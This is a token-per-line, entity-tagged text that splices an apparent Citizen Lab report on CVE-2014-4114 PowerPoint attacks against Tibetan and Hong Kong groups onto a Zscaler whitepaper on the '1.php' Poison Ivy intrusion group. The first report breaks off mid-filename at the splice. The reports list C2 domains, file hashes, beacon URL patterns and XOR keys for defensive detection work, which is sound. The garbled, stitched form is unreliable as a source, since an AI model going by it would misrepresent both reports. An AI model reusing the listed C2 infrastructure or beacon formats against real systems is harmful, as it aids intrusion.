The
third
attack
was
sent
to
Tibetan
groups
on
May
6
2015
and
contained
a
simpler
message
than
previous
attacks
that
urges
the
recipient
to
download
a
file
from
Google
Drive
,
appears
to
repurpose
legitimate
content
.

Dear
Sir/Madam
,
I
have
shared
the
Biography
of
H.H.
THE
14TH
DALAI
LAMA
via
Google
Drive
.

Kindly
download
it
.

PowerPoint
Slideshow
files
do
not
display
properly
on
Google
Drive
,
and
therefore
a
recipient
may
be
tempted
to
download
and
open
the
file
on
their
computer
.

The
use
of
Google
Docs
is
potentially
evidence
of
attackers
changing
tactics
in
reaction
to
the
Detach
from
Attachments
campaign
.

HONG
KONG
ATTACK
CAMPAIGNS
We
analyzed
two
attacks
sent
over
the
course
of
March
2015
that
targeted
individuals
associated
with
human
rights
groups
and
pro-democratic
political
parties
in
Hong
Kong
.

Hong
Kong
Attack
1
:
March
6
,
2015
The
first
attack
was
sent
on
March
6
2015
.

The
email
signature
was
made
to
appear
to
come
from
an
assistant
of
Dr
.

Margaret
Ng
who
is
a
Barrister
and
a
former
member
of
the
Legislative
Council
in
Hong
Kong
.

The
.pps
attachment
used
a
decoy
document
that
appears
to
repurpose
slides
from
an
actual
presentation
Dr
.

Ng
gave
to
Columbia
Law
School
in
February
2015
.

4
June
2015
Hong
Kong
Attack
2
:
March
31
,
2015
The
second
attack
was
sent
on
March
31
2015
,
and
contained
a
message
related
to
the
Occupy
Central
protests
.

The
.pps
file
attachment
was
also
related
to
Occupy
Central
and
appears
to
repurpose
legitimate
content
.

INFECTION
Despite
the
variety
of
targets
and
delivery
approaches
,
the
malware
shares
a
common
infection
process
.

When
the
PowerPoint
Slideshow
is
played
,
the
malware
leverages
CVE-2014-4114
,
a
vulnerability
in
the
OLE
Package
Manager
to
infect
the
target
machine
.

Computers
using
Windows
Vista
and
above
are
susceptible
to
this
attack
.

In
addition
to
the
decoy
document
,
the
malicious
slideshow
contains
two
embedded
OLE
objects
:
a
.inf
file
and
a
malicious
executable
with
a
.gif
extension
that
are
dropped
to
the
temp
folder
.

The
.inf
file
is
used
to
copy
the
executable
and
then
run
it
.

The
CVE-2014-4114
vulnerability
has
been
described
by
Rapid7
and
was
previously
linked
to
the
'
Sandworm B_malware_unknown
'
Russian
threat
actor
.

In
these
previously
reported
attacks
,
the
.inf
and
.gif
files
are
copied
from
a
remote
smb
share
to
the
victim
's
computer
.

In
the
attacks
we
describe
here
the
payload
is
embedded
in
the
OLE
objects
,
similar
to
cases
described
by
TrendMicro
.

Since
CVE-2014-4114
is
a
vulnerability
in
the
OLE
package
manager
it
makes
it
possible
for
attackers
to
create
a
PowerPoint
presentation
in
which
the
OLE
package
manager
loads
a
fake
.gif
file
(
that
is
actually
a
malicious
executable
)
,
and
then
a
malicious
.inf
file
that
runs
the
executable
.

If
a
user
double
clicks
on
the
malicious
attachment
,
the
decoy
file
opens
without
crashing
the
program
or
producing
any
other
obvious
signs
that
something
is
wrong
with
the
file
.

This
behaviour
contrasts
with
how
other
common
CVEs
used
to
target
groups
in
the
Tibetan
community
(
e.g
,
CVE-2012-0158
,
CVE-2010-3333
)
behave
,
which
typically
cause
the
vulnerable
program
to
crash
before
opening
a
decoy
document
.

The
exploit
used
in
these
attacks
does
not
contain
shell
code
,
which
makes
it
harder
for
AV
heuristics
to
detect
it
.

Of
the
samples
we
analyzed
that
have
been
uploaded
to
VirusTotal
,
two
currently
have
0
detections
out
of
57
AV
engines
(
see
Table
1
)
.

Table
1
:
AV
Detection
Rates
Sample
MD5
18bb1ce405e4abac4b0fc63054 B_hash
beac6c I
8a18a13910838d08e38db80a0 B_hash
8e15bd5 I
AV
Detection
Rate
(
Orignal
Submission
)
Date
/
Time
:
2015-04-30
13:44:39
Detection
rate
:
0/56
Date
/
Time
:
2015-03-06
02:30:16
Detection
rate
:
0/57
2a544922d3ece4351c1af4ca63 B_hash
c24550 I
Date
/
Time
:
2015-05-06
09:28:05
Detection
rate
8/57
AV
Detection
Rate
(
Current
)
Date
/
Time
:
2015-06-04
11:53:17
Detection
rate
:
0/57
Date
/
Time
:
2015-06-05
18:36:01
Detection
rate
:
0/57
Date
/
Time
:
2015-06-05
18:38:17
20/57
Detection
rate
:
20/57

PLUGX B_malware_backdoor
ATTACKS

Three
of
the
sampled
we
analyzed
used
the
PlugX B_malware_backdoor
malware
family
.

PlugX B_malware_backdoor
is
a
well-known
malware
family
that
researchers
have
observed
being
used
in
targeted
attacks
against
NGOs
,
government
institutions
,
and
private
companies
.

A
Trend
Micro
report
on
PlugX B_malware_backdoor
,
describes
a
long-standing
campaign
that
previously
used
Poison
Ivy
,
another
malware
family
.

Jaime
Blasco
at
AlienVault
claims
to
have
tracked
down
the
author
of
PlugX B_malware_backdoor
,
who
is
allegedly
based
at
a
Chinese
security
company
.

In
these
three
samples
,
the
embedded
executable
in
OLE
is
a
self
extracting
RAR
containing
the
three
components
of
PlugX B_malware_backdoor
:
a
signed
legitimate
executable
,
a
malicious
DLL
,
and
a
binary
file
containing
the
main
payload
.

Using
a
technique
known
as
DLL
sideloading
,
the
legitimate
executable
runs
the
malicious
DLL
.

This
malicious
code
then
decrypts
and
decompresses
the
binary
8
file
in
memory
which
contains
the
main
functionality
.

Since
the
malicious
code
is
being
run
by
a
signed
,
legitimate
executable
,
and
the
payload
never
exists
unencrypted
on
disk
,
it
is
more
difficult
for
AV
to
detect
PlugX B_malware_backdoor
.

For
two
of
the
three
Plug B_malware_backdoor
X I
samples
the
the
malware
leverages
expired
certificates
from
legitimate
vendors
:
one
executable
signed
by
Microsoft
and
one
by
F-Secure
.

Figure
3
:
Microsoft
Certificate

Figure
4
:
F-Secure
Certificate

Connections
To
Other
Malware
Families
And
Campaigns

While
three
attacks
used
PlugX B_malware_backdoor
malware
,
two
other
attacks
did
not
.

One
of
these
attacks
targeted
Tibetan
groups
,
the
second
targeted
Hong
Kong-based
groups
.

The
non-PlugX
attack
against
Tibetan
groups
communicates
with
free1999.jkub.com B_url.cncsvr
,
a
C2
that
we
have
previously
observed
in
multiple
campaigns
using
the
Surtr B_malware.unknown
malware I
family
and
targeting
Tibetan
groups
.

The
Valkyrie-X
Security
Research
Group
has
also
observed
this
C2
used
in
attacks
against
Hong
Kong-based
groups
.

The
non-PlugX
attack
against
Hong
Kong-based
groups
used
a
malware
family
that
Symantec
calls
Wofeksad B_malware.infosteal
and
connects
to
the
C2
eset-windows.findhere.org B_url.cncsvr
.

We
have
observed
the
Wofeskad
malware
family
in
another
attack
against
a
large
International
NGO
that
works
on
multiple
countries
and
issues
.

However
,
that
attack
used
CVE-2012-0158
and
communicated
with
a
different
C2
.

Details
of
the
samples
analyzed
in
this
report
are
outlined
in
Table
2
.

Table
2
:
Sample
Details
Sample
MD5
8a18a13910838d08e38db80a B_hash
08e15bd5 I
705147c509206151c22515ef B_hash
568bac51 I

Delivery
Mechani
sm
Email
Attachm
ent
Email
Attachm
ent
Targe
ted
Group

Malwa
re
Family
Hong
Kong
Wofeks B_malware.infosteal
ad I
Hong
Kong
June
2015
Command
and
Control
eset-windows.findhe B_url.cncsvr
re.org I
dnsupdate.dyna B_url.cncsvr
mic-dns.net I
dnsupdate.dyna B_url.cncsvr
mic-dns.net I
good.wha.la  B_url.cncsvr
free1999.jkub.c  B_url.cncsvr
om I
PlugX B_malware.backdoor
(
Sideloa
d
F-Secure
)
PlugX B_malware.backdoor
(
Sideloa
d
F-Secure
)
PlugX B_malware.backdoor
(
Sideloa
d
Microso
ft
Office
2003
compon
ent
)
Not
identifie
d
18bb1ce405e4abac4b0fc6305 B_hash
4beac6c I
Email
Attachm
ent
Tibeta
n
2a544922d3ece4351c1af4ca6 B_hash
3c24550 I
Google
Drive
Link
Tibeta
n
d7832e76ee2c5c48ae428e575 B_hash
99b589e I
Email
Attachm
ent
Tibeta
n

Conclusion

The
re-purposed
content
,
low
AV
detection
rate
,
and
the
lack
of
any
obvious
signs
to
a
user
that
the
files
are
malicious
(
such
as
a
program
crash
)
make
these
attacks
concerning
.

In
the
case
of
the
Tibetan
attacks
,
the
use
of
CVE-2014-4114
shows
a
shift
in
tactics
and
a
possible
move
away
from
CVE-2012-0158
,
which
is
the
most
commonly
used
CVE
we
have
seen
in
attacks
against
the
community
.

In
addition
,
the
use
of
Google
Drive
further
suggests
a
potential
change
in
tactics
,
possibly
in
response
to
behavioral
countermeasures
developed
by
Tibetan
civil
society
.

The
overlap
in
attacks
against
Tibet
and
Hong
Kong
groups
also
raises
questions
for
future
work
.

Are
the
attacks
being
conducted
by
the
same
threat
actor
,
or
is
there
sharing
of
TTPs
between
actors
targeting
these
groups
?

Further
analysis
of
attacks
against
these
communities
is
needed
to
probe
these
questions
.

Acknowledgements

Special
thanks
to
Valkyrie-X
Security
Research
Group
.

The
Citizen
Lab
's
research
on
Targeted
Threats
against
Civil
Society
is
supported
by
the
John
D.
and
Catherine
T
.
MacArthur
Foundation
.

Indicators
of
Compromise

Tibet
Attack
1

Attachment
File
Name
:
Xi
Jinping
's
Tibet
Challenge.pps
MD5
:
18bb1ce405e4abac4b0fc63054beac6c B_hash
Drops
File
name
:
fsavstrt.exe B_malware.drop
MD5
:
9459478ab9a9b996de683789f77b185c B_hash
File
name
:
FSMA32.dll
MD5
:
8432c77b12343d59d991b0d0e0c12f7d B_hash
File
name
:
FSMA32.dllfox
MD5
:
db5a9c790e909629aaf7079b6996861f B_hash

Command
and
Control
:
dnsupdate.dynamic-dns.net B_url.cncsvr

Tibet
Attack
2

Attachment
File
name
:
Desmond
Tutu.pps
MD5
:
d7832e76ee2c5c48ae428e57599b589e
Drops
File
name
:
putty.gif.exe B_malware.drop
MD5
:
a990071b60046863c98bcf462fede77a B_hash
Command
and
Control
:
free1999.jkub.com B_url.cncsvr

Tibet
Attack
3

Attachment
File
name
:
H.H.
THE
14TH
DALAI
LAMA.pps
MD5
:
2a544922d3ece4351c1af4ca63c24550 B_hash

Drops
File
name
:
SX.exe B_malware.drop
MD5
:
5730866b34ef589bd398c9a9b6d7e307 B_hash
File
name
:
SXLOC.dll
MD5
:
d839691657ca814be13d5c9c6511d6b2 B_hash
File
name
:
SXLOC.zap
MD5
:
03c900a1b115e759b32e4172dec52aa2 B_hash
Command
and
Control
:
good.wha.la B_url.cncsvr

Hong
Kong
Attack
1
Attachment
Name
:
'佔領�Whitepaper
:

Alleged
APT
Intrusion
Set
:
'1.php
'
Group


Alleged
APT
Intrusion
Set
:
'1.php
'
Group

Summary

The
following
release
statement
provides
a
brief
summary
of
information
related
to
the
'1.php
'
Group
dating
from
2008
to
present
.

This
Group
's
methods
tend
to
be
spear-phishing
emails
with
malicious
PDF
attachments
or
web
links
to
binary
executables
with
a
Poison
Ivy
remote
administration
tool
(
RAT
)
payload
.

The
Group
's
targeted
victims
included
China/US
relations
experts
,
Defense
entities
,
and
the
Geospatial
industry
.

Zscaler
detected
repeated
infections
from
this
Group
to
a
customer
related
to
this
target
list
.

The
following
report
summarizes
the
incident
details
to
increase
awareness
of
these
attacks
in
order
to
increase
detection
,
response
,
and
prevention
.

A
much
more
detailed
report
has
been
provided
to
impacted
parties
,
stakeholders
,
and
other
trusted
groups
dealing
with
these
incidents
.

The
larger
report
dives
into
more
details
about
the
command
and
control
servers
(
C
&
Cs
)
being
used
by
this
Group
.

If
you
are
working
on
similar
research
would
like
to
collaborate
,
please
contact
threatlabz@zscaler.com
and
we
will
share
the
detailed
report
with
select
entities
.

Introduction
Zscaler
provides
inline
security
and
policy
enforcement
of
web
and
email
transactions
to
include
full-content
inspection
and
comprehensive
transaction
logging
and
analysis
.

Given
that
many
of
Zscaler
's
customers
are
large
enterprises
,
it
is
not
surprising
that
some
have
been
the
target
of
so
called
Advanced
Persistent
Threats
(
APTs
)
.

During
the
course
of
our
daily
activities
researching
various
threats
,
Zscaler
ThreatlabZ
often
uncovers
infected
hosts
that
we
believe
have
been
compromised
via
attacks
that
bear
the
signature
of
an
APT
attack
.

While
there
is
no
universally
accepted
definition
of
APT
attacks
,
for
the
purposes
of
this
paper
we
will
leverage
Richard
Bejtlich
's
blog
post
on
the
subject1

This
Group
's
methods
tend
to
be
spear-phishing
emails
with
malicious
PDF
attachments
or
web
links
to
binary
executables
with
a
(
RAT
)
payload
.
'

-Zscaler
ThreatLabZ

'
The
Group
's
targeted
victims
included
China/US
relations
experts
,
Defense
entities
,
and
the
Geospatial
industry
.
'

-Zscaler
ThreatLabZ

Advanced
means
the
adversary
can
operate
in
the
full
spectrum
of
computer
intrusion
.

They
can
use
the
most
pedestrian
publicly
available
exploit
against
a
well-known
vulnerability
,
or
they
can
elevate
their
game
to
research
new
vulnerabilities
and
develop
custom
exploits
,
depending
on
the
target
's
posture
.

Persistent
means
the
adversary
is
formally
tasked
to
accomplish
a
mission
.

They
are
not
opportunistic
intruders
.

Like
an
intelligence
unit
they
receive
directives
and
work
to
satisfy
their
masters
.

Persistent
does
not
necessarily
mean
they
need
to
constantly
execute
malicious
code
on
victim
computers
.
Rather
,
they
maintain
the
level
of
interaction
needed
to
execute
their
objectives
.

Threat
means
the
adversary
is
not
a
piece
of
mindless
code
.

This
point
is
crucial
.

Some
people
throw
around
the
term
'threat
'
with
reference
to
malware
.

If
malware
had
no
human
attached
to
it
(
someone
to
control
the
victim
,
read
the
stolen
data
,
etc
.

)
,
then
most
malware
would
be
of
little
worry
(
as
long
as
it
did
n't
degrade
or
deny
data
)
.

Rather
,
the
adversary
here
is
a
threat
because
it
is
organized
and
funded
and
motivated
.

Some
people
speak
of
multiple
'groups
'
consisting
of
dedicated
'crews
'
with
various
missions
.
'

...the
adversary
here
is
a
threat
because
it
is
organized
and
funded
and
motivated
.

Some
people
speak
of
multiple
'groups
'
consisting
of
dedicated
'crews
'
with
various
missions
.
'

-Richard
Bejtlich
,
TaoSecurity
blog

Contents
Summary.......................................................................................................................
1
Introduction
...................................................................................................................
1
Section
1
:
'1.php
'
Group
Open-Source
Intelligence
(
OSINT
)
.........................................
5
Section
2
:
Customer
Infection
Behavior
........................................................................
8
2.1
GET
Beacons
with
Modified
XOR
Parameters.........................................................
8
2.2
GET
Beacons
with
Data
moved
to
URL
path
...........................................................
9
2.3
HTTPS
CONNECTs
to
C
&
Cs
...................................................................................
9
Section
3
:
Indent
Inter-Relationships
............................................................................
10
3.1
Possible
Relationship
to
Other
APT
Incidents
.........................................................
12
Section
4
:
Lessons
Learned
..........................................................................................
13
4.1
Conduct
logging
and
analytics
within
your
environment
.........................................
13
4.2
Correlate
with
other
sources
..................................................................................
14
4.3
APTs
are
not
always
that
'Advanced
.......................................................................
14
4.4
APTs
are
not
limited
to
the
United
States
Government
or
Defense
Industrial
Base
...
14
4.5
APT
Information
Disclosure
Remains
a
Challenge
..................................................
15
Conclusion
....................................................................................................................
16

Once
unzipped
,
the
malware
is
a
Windows
executable
with
an
SCR
extension
that
is
identified
as
a
Poison
Ivy
RAT
variant
.
'

-Zscaler
ThreatLabZ

Section
1
:
'1.php
'
Group
Open-Source
Intelligence
(
OSINT
)

There
is
a
good
deal
of
information
in
the
public
domain
related
to
'1.php
'
Group
incidents
(
malware
and
C
&
Cs
)
that
can
be
correlated
with
incident
activity
that
we
identify
and
detail
within
this
report
.

Intrusion
activities
related
to
this
Group
date
back
at
least
to
2009
,
if
not
earlier
(
there
is
one
sample
we
found
dating
back
to
2008
)
.

For
example
,
a
December
7
,
2009
blog
post
by
Contagio2
details
a
malicious
phishing
email
regarding
United
States
troop
deployment
in
Afghanistan
that
provides
a
malicious
link
to
:
File
name
:
WWW.DREAMLIFES.NET/Afghanistan/Afghanistan.zip B_malware.drop
.

MD5
:
052E62513505A25CCFADF900A052709C B_hash

Once
unzipped
,
the
malware
is
a
Windows
executable
with
an
SCR
extension
that
is
identified
as
a
Poison
Ivy
RAT
variant
.

Beyond
simple
phishing
attacks
with
links
to
malware
,
the
Group
also
sends
spearphishing
emails
with
malicious
PDF
attachments
to
their
targets
.

For
example
,
the
SANS
ISC
Handler
's
Diary
drew
attention
to
this
Group
's
phishing
campaign
exploiting
CVE-2009-4324
in
January
2010
.

A
screenshot
of
their
story
headline
is
below
in
:
Figure
1
SANS
ISC
Diary
Headline
related
to
'1.php
'
malware
campaign3
.

Figure
1
SANS
ISC
Diary
Headline
related
to
'1.php
'
malware
campaign

An
example
of
one
of
the
Poison
Ivy
RAT
payloads
used
during
this
campaign
was
:
File
name
:
SUCHOST.EXE B_malware.backdoor
dropped
from
Request.pdf
email
attachment
MD5
:
B0EECA383A7477EE689EC807B775EBBB B_hash

This
file
received
commands
from
:
CECON.FLOWER-SHOW.ORG
.

More
recently
,
in
July
2011
,
open-source
reports4
exist
of
Poison
Ivy
usage
surrounding
the
FLOWER-SHOW.ORG
domain
.

This
incident
exploited
PDF
vulnerabilities
(
CVE-2010-2883
)
in
attached
spear-phishing
emails
targeting
experts
on
Japan
,
China
,
Taiwan
/
USA
relationships
.

See
a
screenshot
of
the
email
in
:
Figure
2
Spear-phishing
email
with
attachment
exploiting
CVE-2010-2883
.

Figure
2
Spear-phishing
email
with
attachment
exploiting
CVE-2010-2883

Once
the
Poison
Ivy
payload
is
installed
,
it
frequently
uses
a
unique
beaconing
pattern
to
communicate
with
a
C
&
C
server
.

To
illustrate
the
communication
sequence
,
reference
the
Joebox
sandbox
report5
for
the
following
file
:
File
name
:
Halloween.scr
MD5
:
5B90896127179F0AD2E6628593CDB60D B_hash

The
'1.php
?
=
'
HTTP
GET
request
for
the
initial
C
&
C
checkin
has
been
identified
in
the
majority
of
past
incidents
involving
this
Group
and
is
the
reason
for
the
informal
'1.php
'
name
used
to
describe
this
intrusion
set
.
'

This
report
shows
that
once
infected
,
the
victim
:

Communicates
with
C
&
Cs
:

FREE.COFFEELAUCH.COM B_url.cncsvr
(
98.126.69.3 B_ip.cncsvr
)

FIREHAPPY.SYTES.NET B_url.cncsvr
*
(
98.126.69.3 B_ip.cncsvr
)

Via
HTTP
GET
requests
to
the
path
:
/1.php?id=[data1]&id=[data2
]
&
id=
[
data3
]
&
id=
[
data4
]
&
id=
&
id=

2.php
,
3.php
,
and
4.php
with
id
parameters
and
some
with
an
ending
&
Done
have
also
been
observed

The
data
parameters
are
information
about
the
infected
host
(
IP
,
hostname
,
MAC
address
,
username
,
and
OS/system
version
)
that
have
been
base64
encoded
and
then
XORed
.

XOR
keys
of
0x3C
and
0x3E
have
been
observed
.

An
asterisk
following
a
domain
will
designate
No-IP6
dynamic
DNS
domains
in
this
report
.

Dynamic
DNS
is
a
service
that
provides
free
,
cheap
flexible
domain
hostname
to
IP
address
resolution
and
No-IP
is
one
of
the
many
vendors
in
this
space
.

While
the
malware
variants
used
are
generally
referred
to
as
Poison
Ivy
variants
,
there
are
many
cases
of
them
being
detected/labeled
as
a
generic
Trojan
,
Backdoor
,
or
something
else
entirely
.

For
example
,
in
a
December
2009
malware
report
Kaspersky
lists
one
variant
as
Trojan
.

Win32.Buzus.cvdu7
and
in
June
2010
another
as
Trojan.Win32.Agent
.
eevf8 . Note
the
'1.php?id=
'
HTTP
GET
request
for
the
initial
C
&
C
check-in
.

This
specific
behavior
has
been
identified
in
the
vast
majority
of
past
incidents
involving
this
Group
and
is
reason
for
the
informal
'1.php
'
name
used
to
describe
these
intrusion
sets
within
the
report
.

More
information
may
be
garnered
from
the
open-source
community
,
but
the
above
should
be
a
sufficient
introduction
into
the
tactics
,
techniques
,
and
procedures
(
TTPs
)
of
this
Group
.

Zscaler
believes
that
ongoing
attacks
against
a
sensitive
customer
are
directly
related
to
the
'1.php
'
Group
.
'

-Zscaler
ThreatLabZ

Section
2
:
Customer
Infection
Behavior

Zscaler
has
observed
on-going
attacks
from
June
2010
to
present
,
involving
a
Cleared
Defense
Contractor
.

Given
the
entity
involved
and
the
characteristics
of
the
traffic
observed
,
Zscaler
believes
that
the
attack
is
directly
related
to
the
'1.php
'
Group
.

While
these
attacks
appear
related
to
the
'1.php
'
Group
,
the
beacons
do
not
bear
the
previously
mentioned
'1.php
'
HTTP
path
.

However
,
there
are
many
similarities
regarding
these
'new
'
beacons
as
well
as
direct
relationships
regarding
previously
identified
domains
and
IPs
used
by
the
'1.php
'
group
.

Presumably
,
these
'new
'
beacon
behaviors
have
been
altered
to
evade
any
signatures
designed
to
detect
the
previous
'1.php
'
beaconing
behavior
.

2.1
GET
Beacons
with
Modified
XOR
Parameters

One
of
the
first
variations
that
we
noticed
in
the
attacks
,
was
that
the
infected
hosts
sent
HTTP
GET
request
check-ins
to
URLs
with
the
general
pattern
of
:
FQDN/css.ashx?sc=[data1]&sp=[data2]&ad=
[
data3
]
&
dh=
[
data4
]
&
mr=
[
d
ata5
]
&
tk=
The
data
parameters
contained
the
same
victim
information
as
mentioned
in
the
'1.php
'
beacons
and
were
also
base64
encoded
and
XORed
with
a
key
.

Examples
of
C
&
Cs
that
we
observed
for
this
particular
check-in
variant
include
:

HOUSE.SUPERDOGDREAM.COM B_url.cncsvr

HOME.ALLMYDEARFRIENDS.COM B_url.cncsvr

GOOGLETIME.SERVEIRC.COM B_url.cncsvr
*

INFO.SPORTGAMEINFO.COM B_url.cncsvr

PEOPLE.ENJOYHOLIDAYS.NET B_url.cncsvr

PEARHOST.SERVEHALFLIFE.COM B_url.cncsvr
*
(
June
2010

1st
C
&
C
observed
in
infection
)

...it
is
currently
believed
that
the
infection
point
was
through
malicious
email
attachments
(
as
was
the
case
in
many
of
the
'1.php
'
OSINT
incidents
)
.
'

-Zscaler
ThreatLabZ

2.2
GET
Beacons
with
Data
moved
to
URL
path

The
next
variation
that
we
noticed
in
attacks
,
involved
the
infected
hosts
sending
HTTP
GET
request
check-ins
to
URLs
with
the
general
pattern
of
:
FQDN/
[
data1
]
/
[
data2
]
/
[
data3
]
/
[
data4
]
/
[
data5
]

The
data
did
not
appear
to
be
XORed
in
the
same
manner
as
the
beacons
that
were
previously
identified
.

However
,
based
on
size
and
number
of
data
blocks
,
it
appears
that
the
beacons
contain
similar
information
from
the
victims
.
Examples
of
C
&
Cs
used
in
this
infection
variant
include
:

SATELLITE.QUICKSEARCHMOVIE.COM B_url.cncsvr

WWW.TOYHOPING.COM B_url.cncsvr

WORK.FREETHROWLINE.NET B_url.cncsvr

SEA.ANIMALFANS.NET B_url.cncsvr

WWW.SEARCHSEA.NET B_url.cncsvr

LOVE.ANIMALFANS.NET B_url.cncsvr

WWW.JOBCALL.ORG B_url.cncsvr

2.3
HTTPS
CONNECTs
to
C
&
Cs

The
latest
variations
on
these
attacks
are
related
to
customer
infections
beginning
on
August
3
,
2011
.

Prior
to
infection
for
this
incident
,
as
well
as
the
previous
ones
listed
,
web
transaction
logs
did
not
provide
any
strong
evidence
of
the
infection
point
-
it
is
currently
believed
that
the
infection
point
was
through
malicious
email
attachments
(
as
was
the
case
in
many
of
the
'1.php
'
OSINT
incidents
)
.

Following
infection
,
many
web
transactions
were
witnessed
each
hour
to
the
C
&
C
servers
via
HTTPS
with
the
following
behaviors
:
-
CONNECT
on
port
443/TCP
with
200
HTTP
response
code
-
HTTP
request
version
1.0
with
HTTP
response
version
1.1
-
Request
size
for
'keep-alive
'
beacons
were
primarily
227
-
228
bytes
-
Response
size
is
most
commonly
between
969
-
990
bytes
-
Microsoft
Internet
Explorer
6.0
user-agent
string
(
hard-coded
into
malware
,
as
this
is
not
a
standard
browser
for
this
customer
)

Examples
of
C
&
Cs
used
in
this
infection
variant
include
:
-
WWW.SAVAGECOUNTY.NET B_url.cncsvr
-
LOOK.CAPTAINSABERTOOTH.NET B_url.cncsvr
-
GEOINFO.SERVEHTTP.COM B_url.cncsvr
*
-
ROSE.OFFICESKYLINE.COM B_url.cncsvr
-
WWW.CAREERCHALLENGES.NET B_url.cncsvr
-
OFFER.AMERICAMS.N B_url.cncsvr

Section
3
:
Incident
Inter-Relationships
There
are
a
number
of
domains
and
IP
addresses
that
have
been
tied
to
the
previously
mentioned
incidents
.

Toward
the
beginning
of
the
report
it
was
stated
that
we
believed
all
of
these
incidents
to
be
related
.

As
has
already
been
seen
,
there
are
some
similarities
across
the
incidents
,
such
as
same
victim
organization
,
similar
beaconing
data
blocks
,
and
infection
believed
to
be
from
malicious
email
attachments
.

However
,
the
strongest
evidence
for
their
relationship
is
the
fact
that
related
domains
and
IPs
are
used
for
C
&
Cs
across
these
incidents
.

The
following
Figure
3
-
Link-Graph
of
'1.php
'
Incident
Inter-Relationship
provides
this
illustration
with
only
a
small
snippet
of
information
from
these
incidents
:

DOMAIN
HOSTNAME
IP
RESOLUTION
firehappy.sytes.net B_url.cncsvr
free
OSINT
'1.php
'
Incidents
coffeelaunch.com B_url.cncsvr
Zhang
,
Yao
hua
'
Registration
details
ICP100.net
nmaeservers
2.1
Incidents
dreamlifes.net B_url.cncsvr
seablow.net B_url.cncsvr
superdogdream.com B_url.cncsvr
allmydearfriends.com B_url.cncsvr
sportgameinfo.com B_url.cncsvr
enjoyholidays.net B_url.cncsvr
2.2
Incidents
jobcall.org B_url.cncsvr
2.3
Incidents
geoinfo.servehttp.com B_url.cncsvr
officeskyline.com B_url.cncsvr
captainsabertooth.net B_url.cncsvr
savagecounty.net B_url.cncsvr
Figure
3
-
Link-Graph
of
'1.php
'
Incident
Inter-Relationship
98.126.69.3 B_ip.cncsvr
178.63.130.197 B_ip.cncsvr
46.4.209.130 B_ip.cncsvr
Example
of
Possible
Victim
Names
image
tastfine
house
do
:
dream
smart
rose
qinetiq
qnao
look
www

-Zscaler
ThreatLabZ
There
have
been
a
number
of
interesting
hostnames
used
with
'1.php
'
C
&
C
domains
that
may
include
other
potential
victims
.
'

3.1
Possible
Relationship
to
Other
APT
Incidents
Past
experience
with
APT-style
incidents
show
that
hostnames
may
be
used
to
identify
the
C
&
C
for
particular
victims
of
interest
.

For
example
,
in
bakerhughes.thruthere.net9
was
a
C
&
C
used
against
Baker
Hughes
in
the
disclosed
Night
Dragon10
attacks
.

There
have
been
a
number
of
interesting
hostnames
used
with
'1.php
'
C
&
C
domains
that
may
indicate
other
potential
victims
.

These
hostnames
potentially
identify
victims
within
the
US
Government
(
USG
)
,
Defense
Industrial
Base
(
DIB
)
,
and
Geospatial
industry
.

The
above
link-graph
provides
one
example
of
such
an
entity
that
has
information
about
its
attacks
already
disclosed
in
the
open-source
(
QinetiQ
)
.

'QINETIQ
'
or
'QNAO
'
(
QinetiQ
North
America
Operations
)
for
example
,
was
an
HBGary
customer
.

HBGary
supported
QinetiQ
in
detection
and
analysis
of
on-going
targeted
attacks
against
them
.

Following
the
Anonymous
compromise
and
leakage
of
HBGary
information
,
there
is
significant
information
in
the
public
domain
regarding
the
attacks
against
QinetiQ
.

One
such
example
is
HBGary
's
Incident
Response
Technical
Report
Supplement
for
QinetiQ11 . Page
8
of
that
report
,
in
the
'History
of
the
strain
'
section
states
:
HBGary
has
code-named
this
threat
group
as
'Soysauce
'
.

This
group
is
also
known
as
'Comment
Crew
'
by
some
,
and
also
as
'GIF89a
'
by
some
.

The
choice
of
codename
is
completely
arbitrary
in
this
context
and
is
simply
meant
to
identify
a
group
of
Chinese
hackers
who
have
a
consistent
agenda
to
target
the
defense
industrial
complex
.

The
name
'Comment
Crew
'
and
'GIF89a
'
has
been
used
by
researchers
because
of
the
behavior
of
this
group
to
enclose
C
&
C
commands
within
comments
on
HTML
pages
or
hidden
within
image
files
,
a
technique
known
as
steganography
.

These
indicators
have
not
been
witnessed
in
the
attacks
previously
listed
in
this
report
.

Beyond
a
likely
QinetiQ
attack
relation
,
there
are
a
number
of
other
hostnames
that
indicate
potential
attack
targets
of
the
'1.php
'
Group
.

Disclosure
of
other
possible
victim
names
is
intentionally
omitted
from
this
report
.

9
.

http://hbgary.anonleaks.ch/greg_hbgary_com/2505.html B_url.normal
10
.

http://www.mcafee.com/in/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf B_url.normal
11
.

http://publicintelligence.info/HBGary-QinetiQ.pdf B_url.normal

Section
4
:
Lessons
Learned
A
number
of
lessons
can
be
learned
from
analyzing
incidents
within
this
intrusion
set
.

In
the
following
section
,
we
will
discuss
analytical
techniques
that
enterprises
should
be
adopting
,
in
order
to
uncover
similar
attacks
on
their
organizations
.

4.1
Conduct
logging
and
analytics
within
your
environment

This
report
shows
an
evolution
of
the
beaconing
behavior
from
the
'1.php
'
Group
.

Relying
solely
on
existing
signatures
of
known
threats
would
not
have
triggered
detections
.

By
identifying
transactions
that
are
anomalous
,
it
is
possible
to
detect
previous
or
recurring
incidents
,
such
as
those
identified
above
.

Some
of
the
anomalies
,
which
led
to
the
findings
in
this
report
,
include
:
-
HTTP
version
1.0
requests
with
version
1.1
responses

Numerous
transactions
to
an
unknown
/
uncategorized
domain
-
Some
of
these
transactions
were
to
No-IP
dynamic
DNS
domains
-
Blocking
or
heavily
monitoring
the
communication
to
dynamic
DNS
domains
is
recommended
-
Some
of
these
domains
were
parked
-
Transactions
occur
during
non-standard
times
(
nights
/
weekends
)
-
Some
transactions
(
in
particular
the
GET
beacons
)
had
a
larger
request
size
than
response
size
-
Microsoft
IE
6
user-agent
(
UA
)
string
usage
in
an
environment
that
does
not
typically
use
this
UA

4.2
Correlate
with
other
sources

By
leveraging
data
sources
such
as
passive
DNS
,
domain
registration
information
,
other
open-source
reports
,
and
other
research
-
it
is
possible
to
derive
information
about
probable
domains
and
infrastructure
used
,
in
other
attacks
by
the
same
group
of
attackers
.

In
some
cases
,
this
information
may
provide
indicators
as
to
the
targets
or
purpose
of
the
attacks
.

It
should
also
be
noted
that
making
too
many
assumptions
or
believing
unverified
indicators
as
fact
can
lead
to
misleading
information
.

Anyone
can
set
a
hostname
for
a
C
&
C
to
be
'QINETIQ
'
for
example
.

However
,
by
correlating
these
domains
with
a
group
that
has
been
identified
as
being
involved
in
APT
attacks
,
provides
a
stronger
indication
into
their
possible
target
.

4.3
APTs
